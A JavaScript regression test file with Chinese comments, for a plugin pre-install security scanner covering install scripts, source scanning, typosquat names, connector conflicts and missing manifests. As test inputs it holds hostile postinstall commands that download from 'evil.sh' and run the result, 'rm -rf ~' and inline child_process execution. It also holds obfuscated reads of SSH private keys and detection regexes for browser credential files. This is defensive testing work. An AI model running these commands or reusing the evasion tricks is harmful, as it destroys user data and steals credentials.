// 0.4.1 加固回归：钉住能力评估里发现的 6 处漏检、2 处误判，以及 3 个结构性缺陷。
//
// 每条断言都能在 0.4.0 上打红（反向插桩见文件末尾的说明）：
//   - sec-scripts 的两步下载执行、rm -rf ~、node -e 内联执行 → 0.4.0 判 pass
//   - sec-source 的字符串拼接绕开 .ssh → 0.4.0 判 pass
//   - conflict-connector-tool 参数换序 → 0.4.0 判 pass
//   - runtime-version 预发布宿主 → 0.4.0 判 block（误杀）
//   - sec-typosquat dsh-cad / dsh-cat → 0.4.0 判 warn（误报）
//   - 断网 / git / tarball → 0.4.0 只 warn 就放行；0.4.1 必须 block
import { checkCandidate } from '../lib/rules.js';
import { checkMcp } from '../lib/mcp.js';
import { findLookalikes, scanSourceText } from '../lib/security.js';

let failures = 0;
const ok = (label, condition, extra) => {
  if (condition) console.log(`  ok   ${label}`);
  else {
    failures += 1;
    console.log(`  FAIL ${label}${extra === undefined ? '' : ' -> ' + JSON.stringify(extra)}`);
  }
};

const env = (over = {}) => ({
  dshVersion: '0.3.0',
  dshVersionKnown: true,
  nodeVersion: '24.18.0',
  availableClientPackages: [],
  installedVersions: {},
  profileBundles: [],
  bundleSoftLimit: 40,
  knownBad: [],
  ...over,
});
const manifest = (over = {}) => ({
  name: 'demo-plugin',
  version: '1.0.0',
  main: 'lib/index.js',
  license: 'MIT',
  repository: 'https://example.com/demo',
  scripts: { test: 'node --test' },
  engines: { dsh: '>=0.2.0', node: '>=18' },
  ...over,
});
const levelOf = (report, id) => {
  const list = Array.isArray(report) ? report : report?.checks || [];
  const hit = list.find((c) => c.id === id);
  return hit ? hit.level : 'MISSING';
};
const scriptCheck = (code) => checkCandidate({ spec: 'demo-plugin', manifest: manifest({ scripts: { postinstall: code } }), env: env() });

// ── [A] 安装脚本：0.4.0 漏掉的四类载荷 ─────────────────────────────────────
console.log('\n[A] sec-scripts 补齐：两步下载执行 / 清家目录 / 内联执行');
{
  ok('curl 落盘后 bash 执行 → block', levelOf(scriptCheck('curl -o x.sh http://evil.sh && bash x.sh'), 'sec-scripts') === 'block');
  ok('wget 落盘 + chmod +x + 运行 → block', levelOf(scriptCheck('wget -O x.sh http://evil.sh; chmod +x x.sh; ./x.sh'), 'sec-scripts') === 'block');
  ok('rm -rf ~ → block', levelOf(scriptCheck('rm -rf ~'), 'sec-scripts') === 'block');
  ok('rm -rf $HOME → block', levelOf(scriptCheck('rm -rf $HOME'), 'sec-scripts') === 'block');
  ok('node -e 内联 child_process → block', levelOf(scriptCheck('node -e "require(\'child_process\').execSync(\'id\')"'), 'sec-scripts') === 'block');
  ok('python -c 内联 subprocess → block', levelOf(scriptCheck('python -c "import subprocess; subprocess.run([\'id\'])"'), 'sec-scripts') === 'block');

  // 反向插桩：正常构建脚本 / 只下载不执行，必须仍然 pass
  ok('正常构建脚本不误报', levelOf(scriptCheck('node scripts/build.js'), 'sec-scripts') === 'pass');
  ok('只下载不执行不误报', levelOf(scriptCheck('curl -o vendor.tgz https://example.com/v.tgz'), 'sec-scripts') === 'pass');
  ok('rm -rf ./build 不误报', levelOf(scriptCheck('rm -rf ./build'), 'sec-scripts') === 'pass');
}

// ── [B] 源码：字符串拼接绕过 ───────────────────────────────────────────────
console.log('\n[B] sec-source 去混淆：拼接字符串不再绕过');
{
  const split = 'const d = "." + "s" + "sh"; fs.readFileSync(path.join(os.homedir(), d, "id_" + "rsa"))';
  ok('拼成 .ssh + id_rsa 仍命中', scanSourceText(split, 'lib/x.js').some((h) => h.id === 'priv-ssh' && h.level === 'block'));
  ok('原文直接写 .ssh 命中', scanSourceText('fs.readFileSync(home + "/.ssh/id_rsa")', 'lib/y.js').some((h) => h.id === 'priv-ssh'));
  // 反向插桩：正常字符串拼接不误报
  ok('正常字符串拼接不误报', scanSourceText('const p = "a" + "b" + "c"; console.log(p)', 'lib/z.js').length === 0);
}

// ── [C] 规则表 / 样本文件：不再自己拦自己 ──────────────────────────────────
console.log('\n[C] 同一文件命中 ≥3 条特征时降级为提醒（规则表/样本文件）');
{
  const ruleTable = [
    'const A = /\\.ssh[^\\n]{0,40}id_rsa/;',
    'const B = /Login Data[^\\n]{0,40}sqlite/;',
    'const C = /child_process[^\\n]{0,80}curl/;',
  ].join('\n');
  const hits = scanSourceText(ruleTable, 'lib/security.js');
  ok('规则表文件命中多条 → 全部降级为 warn', hits.length >= 3 && hits.every((h) => h.level === 'warn'), hits.map((h) => `${h.id}:${h.level}`));
  // 反向插桩：只命中 1 条时仍然是 block（不能顺手把真正的载荷也降级）
  const one = scanSourceText('fs.copyFileSync(p + "/Login Data.sqlite", out)', 'lib/steal.js');
  ok('单条命中仍是 block', one.some((h) => h.level === 'block'), one.map((h) => `${h.id}:${h.level}`));
}

// ── [D] 连接器：参数换序不再漏 ─────────────────────────────────────────────
console.log('\n[D] conflict-connector-tool 参数归一化');
{
  const resolved = { resolvedCommand: { exists: true, path: 'C:/uvx.exe' } };
  const reordered = checkMcp(
    { transport: 'stdio', serverName: 'cad3', command: 'uvx', args: ['cmd', '--from', 'pkg'] },
    { ...resolved, existingConnectors: [{ serverName: 'cad', command: 'uvx', args: ['--from', 'pkg', 'cmd'] }] },
  );
  ok('参数顺序不同仍判同一后端', levelOf(reordered, 'conflict-connector-tool') === 'warn');
  const different = checkMcp(
    { transport: 'stdio', serverName: 'other', command: 'uvx', args: ['--from', 'pkg2', 'cmd'] },
    { ...resolved, existingConnectors: [{ serverName: 'cad', command: 'uvx', args: ['--from', 'pkg', 'cmd'] }] },
  );
  ok('参数真的不同时不误报', levelOf(different, 'conflict-connector-tool') === 'pass');
}

// ── [E] 版本：预发布宿主不再误杀 ───────────────────────────────────────────
console.log('\n[E] runtime-version 预发布宿主');
{
  const report = checkCandidate({ spec: 'demo-plugin', manifest: manifest(), env: env({ dshVersion: '0.2.0-rc.1' }) });
  ok('预发布宿主按基线判定 → warn（不是 block）', levelOf(report, 'runtime-version') === 'warn', levelOf(report, 'runtime-version'));
  ok('整体未被阻止', report.blocked === 0, report.blocked);
  const hard = checkCandidate({ spec: 'demo-plugin', manifest: manifest({ engines: { dsh: '>=9.0.0', node: '>=18' } }), env: env({ dshVersion: '0.2.0-rc.1' }) });
  ok('真的不兼容仍然 block', levelOf(hard, 'runtime-version') === 'block');
}

// ── [F] 仿冒：短名换字母不误报，增删/同形仍然报 ────────────────────────────
console.log('\n[F] sec-typosquat 分类');
{
  ok('dsh-cad vs dsh-cat 不误报', findLookalikes('dsh-cad', ['dsh-cat']).length === 0);
  ok('dsh-chekup（少字符）仍报', findLookalikes('dsh-chekup', ['dsh-checkup']).length === 1);
  ok('dsh-ch3ckup（同形替换）仍报', findLookalikes('dsh-ch3ckup', ['dsh-checkup']).length === 1);
  ok('dshmarke（少字符）仍报', findLookalikes('dshmarke', ['dshmarket']).length === 1);
  ok('长短不一的无关包不报', findLookalikes('dsh-univer-office', ['dshmarket', 'dsh-armory']).length === 0);
}

// ── [G] 拿不到元数据 = 零预检，必须拦 ──────────────────────────────────────
console.log('\n[G] manifest-unavailable');
{
  const offline = checkCandidate({ spec: 'x@1.0.0', manifest: undefined, env: env({ manifestReason: 'network-error' }) });
  ok('断网 → block', levelOf(offline, 'manifest-unavailable') === 'block');
  ok('断网时 ok=false', offline.ok === false);

  const git = checkCandidate({ spec: 'git+https://x/y.git', manifest: undefined, env: env({ manifestReason: 'remote-spec-needs-fetch' }) });
  ok('git 形式 → block', levelOf(git, 'manifest-unavailable') === 'block');

  const relaxed = checkCandidate({
    spec: 'x@1.0.0',
    manifest: undefined,
    env: env({ manifestReason: 'network-error', manifestUnavailablePolicy: 'warn' }),
  });
  ok('显式放宽后 → warn', levelOf(relaxed, 'manifest-unavailable') === 'warn');

  ok('不再有重复的 spec 结论', offline.checks.filter((c) => c.id === 'spec').length === 1, offline.checks.map((c) => c.id));
}

// ── [H] registry 安装不再假绿 ──────────────────────────────────────────────
console.log('\n[H] sec-source 三态（扫过且干净 / 没东西可扫 / 跳过）');
{
  const registryLike = checkCandidate({ spec: 'x@1.0.0', manifest: manifest(), env: env(), sourceHits: [], sourceScanned: false });
  ok('没源码可扫 → warn（不是 pass）', levelOf(registryLike, 'sec-source') === 'warn', levelOf(registryLike, 'sec-source'));

  const scanned = checkCandidate({ spec: 'x@1.0.0', manifest: manifest(), env: env(), sourceHits: [], sourceScanned: true });
  ok('扫过且干净 → pass', levelOf(scanned, 'sec-source') === 'pass');

  const legacy = checkCandidate({ spec: 'x@1.0.0', manifest: manifest(), env: env(), sourceHits: [] });
  ok('未传标记时保持旧行为（pass）', levelOf(legacy, 'sec-source') === 'pass');
}

console.log('\n==============================');
console.log(failures === 0 ? 'ALL PASS' : `${failures} FAILURES`);
process.exit(failures === 0 ? 0 : 1);
